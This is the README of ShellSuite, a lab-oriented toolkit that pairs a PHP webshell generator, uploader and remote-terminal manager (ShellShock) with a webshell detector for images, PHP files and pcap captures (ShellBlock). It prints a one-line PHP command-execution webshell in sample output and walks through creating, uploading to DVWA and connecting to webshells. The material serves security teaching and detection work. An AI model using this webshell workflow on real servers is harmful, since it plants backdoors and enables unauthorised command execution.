# ShellSuite

ShellSuite is a CLI-first toolkit with two modules:

- **ShellShock** — webshell generation, upload, management and an interactive terminal.
- **ShellBlock** — read-only detection: file analysis, capture analysis and risk scoring.

Every capability is available from the command line. The Tkinter GUI is a thin
wrapper around ShellShock's CLI; ShellBlock is CLI-only by design.

> **Lab use only.** Use ShellSuite only against systems you own or have explicit
> permission to test. ShellBlock never executes a payload and never sends traffic.

---

## Requirements

- Python **3.10 or newer**
- Dependencies installed by `pip` from `pyproject.toml`:
  - `tree-sitter` and `tree-sitter-php` — PHP parsing for ShellBlock.
  - `pyshark` — Python wrapper over Wireshark's `tshark`.
- **Wireshark** for capture analysis. `tshark` and `capinfos` must be on `PATH`
  (`pip install` cannot provide them).
- Tkinter for the ShellShock GUI:
  - Bundled with the Windows and macOS Python installers.
  - On Debian/Ubuntu: `sudo apt install python3-tk`.

Generated webshells are PHP and are intended for the test lab (DVWA).

---

## Installation

### 1. Get the source

Clone the repository or copy the project folder:

```
git clone https://github.com/ikey14/ShellSuite
```

Open a terminal in the project root (the directory containing `pyproject.toml`).

### 2. Create a virtual environment

Windows PowerShell:

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -e .
```

Linux / macOS:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e .
```

If PowerShell refuses to activate the environment, allow it for the current
terminal only:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\.venv\Scripts\Activate.ps1
```

### 3. Wireshark / tshark

Install Wireshark from <https://www.wireshark.org/download.html>. Its folder
contains `tshark.exe` and `capinfos.exe`.

On Windows, add that folder to `PATH` (the user one) (the default is
`C:\Program Files\Wireshark`) and reopen the terminal:

```powershell
$env:Path += ";C:\Program Files\Wireshark"   # current session only
tshark -v
capinfos -v
```

On Linux/macOS, install the `wireshark-cli` / `wireshark` package; `tshark`
is normally already on `PATH`.

### 4. Verify the installation

```powershell
shellsuite --version
```

Expected output: `shellsuite 0.1.0`.

If the `shellsuite` command is not available, use the module form:

```powershell
python -m shellsuite --version
```

---

## State directory

ShellSuite stores its persistent state under `~/.shellsuite` by default:

```text
~/.shellsuite/
├── registry.json          # known webshells and metadata
├── shells/                # generated webshells
├── sessions/              # per-session .jsonl transcripts
├── shellsuite.log
├── analysis/              # ShellBlock result files (and dumped capture models)
└── score/                 # ShellBlock score files
```

Override the location with the `SHELLSUITE_HOME` environment variable:

Windows PowerShell:

```powershell
$env:SHELLSUITE_HOME = "C:\path\to\shellsuite-state"
```

Linux / macOS:

```bash
export SHELLSUITE_HOME=/path/to/shellsuite-state
```

Results and scores live in sibling directories so either can be searched by hand
without wading through the other. The registry never stores webshell secrets.

---

## Usage

General form:

```text
shellsuite [--version] [-v] <module> <action> [options]
```

Modules:

- `shock` — ShellShock: webshell creation and management
- `block` — ShellBlock: detection, scoring, listing and showing results
- `gui` — launch the ShellShock graphical interface

Use `--help` at any level:

```powershell
shellsuite block --help
shellsuite block analyze --help
shellsuite block list --help
shellsuite shock --help
```

Exit codes:

| Code | Meaning |
|---|---|
| `0` | success (including a malicious file: a detector is not a gate) |
| `1` | target or stage error (missing result, unknown rule, unreadable result) |
| `2` | bad arguments, missing `tshark`/`capinfos`, or a pcapng capture |

---

# ShellBlock

ShellBlock analyses two kinds of targets:

1. **Files** — JPEG, PNG, GIF, PHP and unknown files. It detects PHP hidden in
   image metadata or after the image end, extension/magic mismatches, double
   extensions, PHP sink×source patterns, known webshell families, obfuscation,
   authentication gates and more.
2. **Captures** — `.pcap` files. It filters the capture down to HTTP, notes
   encrypted flows, carves uploaded and response bodies, analyses them with the
   same file pipeline, and inspects request/response semantics.

Analysis never judges; scoring is a separate step that reads only the result
JSON. Nothing is executed and no traffic is generated.

## Analyze a file

```powershell
shellsuite block analyze --file photo.jpg
```

Typical output:

```text
photo.jpg: jpeg, 84213 bytes
  IMG_HIDDEN_PHP         @24      <?php system($_GET['c']); ?>
  SIG_PHP_TAG            @24      <?php
  SIG_PHP_SINK_NAME      @33      system(
  3 findings, 45 raw points → run 'shellsuite block score --file photo.jpg'
result: C:\Users\<you>\.shellsuite\analysis\photo.jpg_result.json
```

Useful options:

| Option | Meaning |
|---|---|
| `--json` | print the full result JSON instead of the summary |
| `--max-size MB` | read at most MB megabytes of the file (default 64) |
| `--score` | chain `analyze` and `score` in one command |
| `--file` | required; file to analyse |

`analyze` writes `~/.shellsuite/analysis/<name>_result.json` atomically. It exits
`0` even when the file is malicious.

## Analyze a capture

```powershell
shellsuite block analyze --file lab-exec.pcap
```

The capture path:

- reads the total frame count with `capinfos`;
- keeps only `http.request` / `http.response` packets with pyshark, optionally
  restricted to one or more hosts;
- collects TLS ClientHellos only for their SNI — HTTPS content is never
  decrypted;
- carves HTTP bodies with `tshark --export-objects`;
- analyses uploaded file parts and other carved bodies with the file pipeline;
- runs capture signature and structural rules over the normalised model.

Capture options:

| Option | Meaning |
|---|---|
| `--host IP` | only packets to/from this IP; repeatable. Without it, all hosts are analysed and the HTTP servers are listed in `notes[]`. |
| `--dump-json` | save the normalised HTTP/TLS model as `<name>_http.json` in the analysis directory |
| `--keep-objects [DIR]` | keep the carved HTTP bodies (in `DIR` when given) instead of deleting the temp directory |
| `--max-size MB` | cap for reading each carved body (default 64) |
| `--score` | chain `analyze` and `score` |

Example with a host filter and kept objects:

```powershell
shellsuite block analyze --file lab-exec.pcap --host 192.168.1.10 --keep-objects .\objects
```

The summary includes the filtering evidence:

```text
lab-exec.pcap: pcap, 524312 bytes
  frames: 812 of 4210 kept for analysis
  ...
```

### Saving a capture from Wireshark

1. Start Wireshark on the lab interface and reproduce the traffic (upload,
   command execution, normal browsing as a control).
2. Stop the capture.
3. **File → Save As**, and choose **“Wireshark/tcpdump/… - pcap”**. Do **not**
   save as pcapng: ShellBlock refuses pcapng with exit code `2` and asks for a
   `.pcap` file.
4. For a command-line capture: `sudo tcpdump -i eth0 -w lab-exec.pcap 'tcp port 80'`.

A capture with synthesised Ethernet/IP framing is a unit-test fixture, never
proof. The memoria annex needs a capture taken on the real lab network.

### Capture limitations

- HTTPS is opaque: only the SNI and flow endpoints are reported
  (`PCAP_TLS_OPAQUE`, one point, plus a note). Ciphertext is never “read”.
- HTTP/2 is not decoded.
- Carved bodies are correlated to TCP streams by name/size; compressed or
  chunked bodies can fail to correlate and are counted in `notes[]` as
  “carved objects not linked to a stream”. They are still analysed as files.
- Uploaded file parts are followed through the normal file pipeline, so PHP
  rules and image rules apply to them too.

## Results

`analyze` writes one result file per target:

```text
~/.shellsuite/analysis/photo.jpg_result.json
~/.shellsuite/analysis/lab-exec.pcap_result.json
```

A result contains `target`, `stages`, `findings`, `notes` and `errors`. Findings
are flat and sorted by `(category, offset, rule_id)`, so two runs over the same
input produce byte-identical files. `evidence` is printable (bytes outside
`0x20–0x7E` become `\xNN`) and capped at 120 characters. Subjects are `file`,
`flow:<src>:<sport>-><dst>:<dport>` or `upload:<name>`.

For captures, `stages[signature]` covers the rebuilt HTTP headers **and** carved
bodies, so its `rules` count is every signature rule in the table; `matched` is
how many of them fired anywhere. `stages[static]` carries `units`, `frames` and
`kept`.

## Score a result

```powershell
shellsuite block score --file photo.jpg
```

`score` reads only the result JSON — it never opens the original file and never
re-runs analysis. It writes `~/.shellsuite/score/photo.jpg_score.json` and prints
the contributions and the final score:

```text
score file C:\Users\<you>\.shellsuite\score\photo.jpg_score.json

  contributions
    IMG_HIDDEN_PHP                 45 ×1  PHP code hidden in an image
    PHP_OS_EXEC_OF_INPUT           50 ×1  OS command built from request input
  categories hidden_payload 45 · code_execution 50 · corroboration +10
  ruleset    2026-11-26+fa510678 · raw 105

  ----------------------------------------------------------
  SCORE  100/100 (100 %)
  ----------------------------------------------------------
```

The formula:

```text
score = min(100, Σ points of distinct rules with points > 0
                 + min(20, 10 × (distinct categories − 1)))
```

- A rule contributes **once** however many findings it produced.
- Corroboration adds 10 per extra category, capped at 20.
- Gate rules (signature rules, `PCAP_TLS_OPAQUE`) have `points: 0`: they appear in
  findings but never in the sum or the category count.
- At one call site the most specific rule wins (`eval($_POST['x'])` emits
  `PHP_EVAL_OF_INPUT`, not also `PHP_EXEC_SINK_ONLY`).
- There is no verdict field: `score` **is** the likelihood percentage (0–100).

`score --json` prints the score file instead of the rendered block.

## List results and scores

```powershell
shellsuite block list results
shellsuite block list scores
```

Both accept `--order FIELD`, `--asc`/`--desc`, `--filter 'attr op value'`
(repeatable, AND) and `--json`.

Result fields: `name`, `detected_type`, `extension`, `size`, `findings`,
`errors`, `analyzed_at`, `type_mismatch`.

Score fields: `name`, `score`, `raw_points`, `categories`, `ruleset`, `capped`,
`sha256`.

`size`, `findings`, `errors`, `score`, `raw_points` and `categories` compare
numerically; `analyzed_at` compares by date. A result without a score file is
absent from `list scores`.

```powershell
shellsuite block list scores --order score --desc --filter "score > 70"
shellsuite block list results --filter "detected_type == php"
shellsuite block list results --filter "analyzed_at == 2026-11-27"
```

## Show one result

```powershell
shellsuite block show --file photo.jpg
```

`show` renders the target, stages, findings and score as a fixed-width block.
Only the five findings that contribute the most points are listed by default;
`--all` lists every finding, and `--json` returns the result plus its score (or
`null` when it has not been scored yet).

## Rules

```powershell
shellsuite block rules
shellsuite block rules --json
shellsuite block rules --validate
```

`rules.json` is the single registry. It currently ships **40 rules**
(29 structural, 11 signature gates) in six categories: `hidden_payload`,
`code_execution`, `obfuscation`, `identity`, `network`, `metadata`.

- **Signature rules** are regex gates: they fire, they appear in findings with
  their offset, and they score 0. They exist to prove the signature stage ran
  and to hand evidence to a structural rule.
- **Structural rules** are Python detectors over the model (image segments, PHP
  AST, capture bodies). They carry the points.
- `--validate` checks duplicate ids, categories, required fields, regex
  compilation, the detector registry and gate rules. A broken table is reported
  with exit code 1.

Rule groups:

- Files — images: `IMG_PHP_BEFORE_SOI`, `IMG_HIDDEN_PHP`,
  `IMG_SCRIPT_IN_SEGMENT`, `IMG_ZIP_AFTER_EOI`, `IMG_TRAILING_DATA`,
  `TYPE_MAGIC_MISMATCH`, `DOUBLE_EXTENSION`.
- Files — PHP: `PHP_EVAL_OF_INPUT`, `PHP_OS_EXEC_OF_INPUT`,
  `PHP_DYNAMIC_CALL_OF_INPUT`, `PHP_INCLUDE_OF_INPUT`, `PHP_WRITE_OF_INPUT`,
  `PHP_OBFUSCATION_LADDER`, `PHP_KNOWN_FAMILY`, `PHP_EXEC_SINK_ONLY`,
  `PHP_AUTH_GATE`, `PHP_REQUEST_HEADER_SOURCE`, `PHP_BASE64_BLOB`,
  `PHP_HIGH_ENTROPY`, `PHP_ONE_LINER`, `PHP_PADDED_TAG`.
- Captures: `PCAP_DISGUISED_UPLOAD`, `PCAP_PHP_UPLOAD`, `PCAP_SHELL_REQUEST`,
  `PCAP_COMMAND_PARAM`, `PCAP_SHELL_RESPONSE`, `PCAP_MISMATCHED_UPLOAD_RESPONSE`,
  `PCAP_BEACONING`, `PCAP_TLS_OPAQUE`.
- Signature gates: `SIG_PHP_TAG`, `SIG_PHP_SINK_NAME`, `SIG_PHP_SUPERGLOBAL`,
  `SIG_PHP_DECODER`, `SIG_BASE64_BLOB`, `SIG_SHELL_FAMILY`, `SIG_SS_PARAM`,
  `SIG_SS_ENVELOPE`, `SIG_SS_RESPONSE`, `SIG_UPLOAD_PART`, `SIG_HTTP_PHP_URI`.

### ShellBlock limitations

- PHP only; no archives, Office or PDF analysis.
- No payload execution, no live capture, no traffic generation.
- `.pcap` only; pcapng is refused so a capture saved in Wireshark's default
  format cannot be silently “clean”.
- No HTTPS decryption, no HTTP/2 decoding.
- No GUI for ShellBlock.
- Capture body samples keep 32 KB at the start and 32 KB at the end; a marker in
  the middle of a very large body is a documented coverage limit.

---

## ShellShock: Webshell Creator

A webshell type is defined by **vector × mode**:

| Vector | How the command is sent |
|---|---|
| `cookie` | HTTP Cookie header |
| `header` | HTTP header |
| `post` | POST body |

| Mode | Meaning |
|---|---|
| `plain` | No authentication |
| `auth` | Requires a secret |
| `encrypted` | Encrypts the payload; authentication is mandatory |

### Create a plain webshell

```powershell
shellsuite shock create --vector cookie --mode plain
```

The default output is `~/.shellsuite/shells/shell.php`. Use `--out` to write
somewhere else and `--name` to name your webshell:

```powershell
shellsuite shock create --vector post --mode plain --name dvwa-post --out .\dvwa-post.php
```

### Create an authenticated webshell

```powershell
shellsuite shock create --vector cookie --mode auth --name dvwa-auth --secret "lab-password"
```

### Create an encrypted webshell

```powershell
shellsuite shock create --vector header --mode encrypted --name dvwa-enc --secret "lab-password"
```

Encrypted mode always requires a secret. Plain mode must not receive one.

### PHP execution driver

The default driver is `shell_exec`. It can be changed with `--driver`:

```powershell
shellsuite shock create --vector post --mode plain --name dvwa-system --driver system
```

Available drivers: `shell_exec`, `system`, `passthru`.

### Secret handling

The secret is embedded in the generated PHP file (not in plain text, as a hash).
It is not stored in `registry.json`. Avoid putting real credentials in shell
history or command-line arguments outside the lab. The GUI asks for passwords
through a masked dialog instead.

---

## ShellShock: Uploader

Upload a generated webshell to an endpoint:

```powershell
shellsuite shock upload --file dvwa-cookie.php --url http://<lab-host>/upload.php
```

`--file` may be a filename relative to `~/.shellsuite/shells/` or an absolute
path.

Common options:

```powershell
shellsuite shock upload `
  --file dvwa-cookie.php `
  --url http://<lab-host>/upload.php `
  --field uploaded `
  --filename dvwa-cookie.php `
  --cookie "PHPSESSID=<session>; security=low" `
  --header "X-Test: value" `
  --form "Upload=Upload"
```

| Option | Meaning |
|---|---|
| `--field` | multipart file field name (default `uploaded`) |
| `--filename` | filename sent to the server (default: local basename) |
| `--cookie` | Cookie header |
| `--header` | extra `Name: value` header; repeatable |
| `--form` | extra multipart form field; repeatable |
| `--timeout` | request timeout in seconds |

The command reports success when the endpoint returns HTTP 200 and prints the
final URL (a failed cookie or a login redirect may change it).

---

## ShellShock: Manager

Everything in this module is also available in the GUI.

### Connect and register a webshell

```powershell
shellsuite shock manage connect `
  --url http://<lab-host>/hackable/uploads/dvwa-cookie.php `
  --vector cookie `
  --mode plain `
  --name dvwa-cookie
```

`connect` runs `id` by default and registers the shell if the connection works.
Use `--command` to test another command:

```powershell
shellsuite shock manage connect `
  --url http://<lab-host>/hackable/uploads/dvwa-auth.php `
  --vector cookie --mode auth --secret "lab-password" `
  --name dvwa-auth --command whoami
```

### List shells and sessions

```powershell
shellsuite shock manage list shells
shellsuite shock manage list sessions
```

Sort and filter:

```powershell
shellsuite shock manage list shells --order name --asc --filter "mode != plain"
shellsuite shock manage list sessions --order commands --desc --filter "commands > 50"
shellsuite shock manage list sessions --id <shell-id> --filter "started_at == 2026-10-25"
```

Shell fields: `name, url, vector, mode, has_secret, created_at, last_used`.
Session fields: `id, shell_id, shell, url, vector, mode, status, started_at,
ended_at, duration, commands`.

Add `--json` for machine-readable output.

### Show one shell or session

```powershell
shellsuite shock manage show shell --id <shell-id>
shellsuite shock manage show session --id <session-id>
```

### Edit, delete and terminal

```powershell
shellsuite shock manage edit shell <shell-id> --name "DVWA low security"
shellsuite shock manage edit shell <shell-id> --clear-name
shellsuite shock manage delete shell <shell-id>
shellsuite shock manage delete session --id <session-id>
shellsuite shock manage terminal <shell-id>
shellsuite shock manage terminal <shell-id> --secret "lab-password"
```

Deleting a shell keeps its recorded sessions. Type `exit` or `quit` to close the
terminal; every command is recorded in a session transcript.

---

## GUI

```powershell
shellsuite gui
```

The GUI uses the same registry, shells and sessions as the CLI.

- **Shells** — list, filter, connect, rename, delete and open a terminal.
- **Sessions** — list recorded sessions, open a terminal, or read a transcript.
- **Filters** — choose a field, operator and value. Date fields open a calendar
  picker; selecting a day stores a `YYYY-MM-DD` value.
- **Terminal** — command history, `exit`/`quit` to close, mouse selection.
- **Secrets** — auth/encrypted shells prompt in a masked dialog; the password is
  passed to the CLI and never stored.

Everything the GUI does can also be done from the CLI.

---

## Filters

ShellShock listings and `block list` share the same grammar:

```text
==   !=   contains   >   <
```

Filters are combined with **AND**:

```powershell
shellsuite block list scores --filter "score > 70" --filter "categories > 2"
shellsuite shock manage list shells --filter "mode != plain" --filter "name contains dvwa"
```

Notes:

- `contains` is case-insensitive.
- `>` and `<` compare numbers numerically when possible.
- Date fields accept `YYYY-MM-DD`; a date matches the whole UTC day.
- Full ISO timestamps are compared as timestamps.
- Missing values do not match date ranges.

Always quote filters containing `>` or `<` so the shell does not treat them as
redirections.

---

## Useful examples

```powershell
# Analyse a suspicious image or PHP file
shellsuite block analyze --file .\uploads\photo.jpg --score
shellsuite block analyze --file .\uploads\shell.php --json

# Analyse a lab capture, narrow it to the target, keep the carved bodies
shellsuite block analyze --file .\lab-exec.pcap --host 192.168.1.10 --keep-objects .\objects --score

# Score everything that has a result and show the risky ones
shellsuite block score --file lab-exec.pcap
shellsuite block list scores --order score --desc --filter "score > 70"

# Inspect one result in detail
shellsuite block show --file lab-exec.pcap --all

# Generate, upload and test a webshell
shellsuite shock create --vector cookie --mode auth --name lab-cookie --secret "lab-password"
shellsuite shock upload --file lab-cookie.php --url http://<lab-host>/upload.php --cookie "PHPSESSID=<session>; security=low"
shellsuite shock manage connect --url http://<lab-host>/hackable/uploads/lab-cookie.php --vector cookie --mode auth --secret "lab-password" --name lab-cookie
```

---

## Development checks

Run the test suite:

```powershell
python -m unittest discover -s tests
```

The suite is headless; the GUI is not opened by the test suite. Capture analysis
needs the external `tshark` binary, so it is exercised manually against lab
captures rather than from the unit suite.

Validate the rule table after any edit:

```powershell
shellsuite block rules --validate
```
